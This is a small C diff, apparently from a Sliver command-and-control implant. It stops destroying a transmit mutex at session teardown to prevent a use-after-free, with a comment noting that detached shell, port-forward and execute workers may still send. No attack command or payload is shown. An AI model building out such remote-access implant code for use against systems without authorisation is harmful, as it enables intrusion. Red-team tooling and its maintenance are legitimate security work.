@@ -318,9 +318,10 @@ out:
     (void)sliver_thread_join(heartbeat);
     heartbeat = NULL;
   }
-  if (tx_lock != NULL) {
-    sliver_mutex_destroy(tx_lock);
-  }
+  /* tx_lock lives for the whole process: detached workers (shell, portfwd,
+   * execute) may still try to send while the session tears down, and destroying
+   * it here was a use-after-free. Leaking one mutex is the safe trade. */
+  (void)0;
   sliver_buf_free(&reg_buf);
   sliver_buf_free(&env_buf);
   if (yamux_ready) {
@@ -331,6 +332,7 @@ out:
   }
   return rc;
 }
+
 
 
 
